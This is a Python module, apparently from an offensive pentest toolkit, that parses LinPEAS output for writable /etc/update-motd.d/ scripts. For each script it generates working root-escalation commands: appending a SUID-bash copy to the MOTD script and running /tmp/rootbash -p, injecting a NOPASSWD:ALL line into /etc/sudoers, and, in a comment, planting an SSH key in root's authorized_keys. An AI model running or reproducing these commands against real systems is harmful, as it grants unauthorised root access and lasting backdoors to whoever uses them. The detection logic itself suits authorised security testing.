"""Detect writable /etc/update-motd.d/ scripts from LinPEAS output.

These scripts run as root on every PAM SSH login — writable = instant CRITICAL.
"""

import re
from typing import Dict, List

# Matches any path under /etc/update-motd.d/
_MOTD_PATH_RE = re.compile(r"(/etc/update-motd\.d/[^\s,;'\"]+)")


def parse_motd_section(section_text: str) -> List[str]:
    """Extract writable /etc/update-motd.d/ file paths from section text."""
    paths: List[str] = []
    seen: set = set()
    for line in section_text.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        for m in _MOTD_PATH_RE.finditer(stripped):
            path = m.group(1).rstrip(".,;:'\"")
            if path not in seen:
                seen.add(path)
                paths.append(path)
    return paths


def generate_commands(motd_path: str) -> List[str]:
    """Generate root-shell exploit commands for a writable MOTD script."""
    return [
        f"echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> {motd_path}",
        "# Trigger: exit and SSH in again (PAM runs MOTD scripts as root)",
        "/tmp/rootbash -p",
        f"echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers' >> {motd_path}",
        f"# Or add SSH key: echo 'mkdir -p /root/.ssh && cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys' >> {motd_path}",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for writable /etc/update-motd.d/ scripts.

    Returns a CRITICAL finding for each writable MOTD script detected.
    """
    findings: List[Dict] = []
    for path in parse_motd_section(section_text):
        findings.append({
            "motd_path": path,
            "severity": "CRITICAL",
            "type": "motd_writable",
            "description": "runs as root on every SSH login",
            "commands": generate_commands(path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
╔══════════╣ Interesting GROUP writable files (not in Home)
Group sysadmin:
-rwxrwxr-x 1 root sysadmin 1234 Jan 2024 /etc/update-motd.d/00-header
-rwxrwxr-x 1 root sysadmin  512 Jan 2024 /etc/update-motd.d/10-help-text
/var/log/app.log
"""
    print("=== parse_motd_section ===")
    for p in parse_motd_section(SAMPLE):
        print(" ", p)

    print("\n=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['motd_path']}  ({f['description']})")
        for cmd in f["commands"][:2]:
            print(f"  $ {cmd}")
